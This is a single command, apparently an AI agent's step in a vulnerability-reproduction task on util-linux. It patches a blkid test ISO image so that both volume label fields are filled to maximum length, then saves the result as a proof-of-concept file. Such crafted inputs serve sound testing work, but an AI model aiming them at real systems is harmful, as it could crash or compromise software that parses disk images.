Command `cd /workspace/repo-vul/src-vul/util-linux && python3 - <<'PY'
import lzma, pathlib
p=pathlib.Path('tests/ts/blkid/images-fs/iso-different-iso-joliet-label.img.xz')
data=bytearray(lzma.decompress(p.read_bytes()))
# modify PVD volume_id to 32 'A's and Joliet volume_id to 16 UTF16BE 'A's
pvd=0x8000
j=0x8800
# volume_id offset 40 in descriptor
for i in range(32): data[pvd+40+i]=ord('A')
for i in range(16): data[j+40+2*i]=0x00; data[j+40+2*i+1]=ord('A')
# ensure escape seq valid already
out='/workspace/poc.iso'
open(out,'wb').write(data)
print(out, len(data))
PY
